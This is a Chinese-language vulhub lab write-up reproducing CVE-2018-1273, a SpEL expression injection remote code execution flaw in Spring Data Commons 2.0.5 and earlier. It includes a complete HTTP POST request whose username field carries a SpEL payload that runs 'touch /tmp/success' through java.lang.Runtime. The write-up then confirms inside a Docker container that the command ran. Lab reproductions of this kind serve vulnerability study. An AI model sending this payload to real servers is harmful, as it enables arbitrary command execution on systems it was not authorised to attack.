

# Spring Data Commons 远程命令执行漏洞（CVE-2018-1273）

###### by ADummy

### 0x00利用路线

​			burpuite抓包--->改包--->SpEL命令执行

### 0x01漏洞介绍

​			Spring Data是一个用于简化数据库访问，并支持云服务的开源框架，Spring Data Commons是Spring Data下所有子项目共享的基础框架。Spring Data Commons 在2.0.5及以前版本中，存在一处SpEL表达式注入漏洞，攻击者可以注入恶意SpEL表达式以执行任意命令。

​			影响版本

  		Spring Data Commons <=2.0.5

### 0x02漏洞复现

​		访问`http://your-ip:8080/users`，将可以看到一个用户注册页面

![Spring_Data_Commons_RCE_1](https://github.com/ADummmy/vulhub_Writeup/blob/main/src/Spring_Data_Commons_RCE_1.jpg)

参考前面链接中的Payload，在注册的时候抓包，并修改成如下数据包：

```
POST /users?page=&size=5 HTTP/1.1
Host: localhost:8080
Connection: keep-alive
Content-Length: 124
Pragma: no-cache
Cache-Control: no-cache
Origin: http://localhost:8080
Upgrade-Insecure-Requests: 1
Content-Type: application/x-www-form-urlencoded
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/64.0.3282.186 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8
Referer: http://localhost:8080/users?page=0&size=5
Accept-Encoding: gzip, deflate, br
Accept-Language: zh-CN,zh;q=0.9,en;q=0.8

username[#this.getClass().forName("java.lang.Runtime").getRuntime().exec("touch /tmp/success")]=&password=&repeatedPassword=
```

执行`docker-compose exec spring bash`进入容器中，可见成功创建`/tmp/success`，说明命令执行成功

![Spring_Data_Commons_RCE_1](https://github.com/ADummmy/vulhub_Writeup/blob/main/src/Spring_Data_Commons_RCE_1.jpg)

